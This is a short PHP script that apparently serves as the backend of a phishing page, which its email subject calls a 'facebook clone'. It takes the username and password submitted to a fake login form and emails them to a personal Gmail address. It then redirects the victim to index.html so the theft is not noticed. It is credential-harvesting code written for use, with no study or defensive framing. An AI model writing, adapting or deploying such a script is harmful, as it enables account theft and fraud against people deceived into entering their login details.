<?php
    $username = $_POST['username'];
    $password = $_POST['password'];

    $email_from = 'sakibrisa@gmail.com';
    $email_subject = 'new submission from facebook clone';
    $email_body = 'Number | Email : $username.\n'.
                    'Password : $password.\n';
    $to = 'sakibrisa@gmail.com';
    $headers = 'From: $email_from \r\n';
    mail($to, $email_subject, $email_body, $headers);
    header("Location: index.html");
?>